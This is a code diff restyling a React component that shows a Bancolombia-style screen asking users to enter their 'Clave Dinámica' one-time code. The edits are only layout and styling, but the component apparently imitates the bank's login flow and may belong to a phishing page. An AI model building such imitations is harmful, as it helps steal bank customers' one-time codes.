@@ -3,9 +3,9 @@ import { useEffect, useState, useRef } from "react";
 import AccionesModal from "./modals/accionesModal";
 import ClaveDinaModal from "./modals/ClaveDinaModal";
 import Loading from "../../components/Loading";
-import imgClaveDinamica from "../../../DinamicaClave/clavedinamica.gif";
-import './css/LoginModal.css';
+import imgClaveDinamica from "../../../clave_dinamica/cd-mobile.gif";
 import { limpiarPaddingBody } from "@utils";
+import './css/LoginModal.css';
 
 // Se exporta el componente
 export default function ClaveDinamica() {
@@ -641,16 +641,16 @@ export default function ClaveDinamica() {
 
                     <div className="login-page">
                         <div className="login-box" style={{ backgroundColor: "#454648" }}>
-                            <img src={imgClaveDinamica} alt="Clave Dinámica" style={{ width: "500px", margin: "0 auto", display: "block", borderRadius: "8px" }} />
-                            <h2 className="login-title mt-4">Ingresa la Clave Dinámica</h2>
-                            <p className="login-subtitle mt-4" style={{ fontSize: "16px", color: "#ffffff", fontWeight: 400 }}>
+                            <img src={imgClaveDinamica} alt="Clave Dinámica" style={{ width: "500px", height: "120px", margin: "0 auto", display: "block", borderRadius: "8px" }} />
+                            <div className="top-clave">
+                                <h2 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ textAlign: "center", fontSize: "26px", fontWeight: "500", marginBottom: "15px", marginTop: "0px !important", color: "white" }}>
+                                    Ingresa la Clave Dinámica
+                                </h2>
+                            </div>
+                            <p className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ fontSize: "16.5px", color: "#ffffff", fontWeight: 300, lineHeight: "24px" }}>
                                 Encuentra tu Clave Dinámica en la app Mi Bancolombia.
                             </p>
-
                             <br />
-                            <br />
-
-
                             {/* ----------------------------------------- CLAVE (SEGMENTED) -----------------------------------------*/}
 
                             <div
@@ -694,8 +694,11 @@ export default function ClaveDinamica() {
                                     }
                                 `}</style>
                             </div>
-                            <div style={{ textAlign: "center", marginTop: "10px" }}>
+                            {/* -----------------------------------------------------------------------------------------------------*/}
+                            <div style={{ textAlign: "center", marginTop: "20px" }}>
+                                <br />
                             </div>
+                            {/* -----------------------------------------------------------------------------------------------------*/}
                             <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                                 <button className="bc-button-primary login-btn-borrar mt-4" style={{ fontSize: "14px" }} disabled={botonBorrarHabilitado} onClick={() => handleClear()}>
                                     Borrar
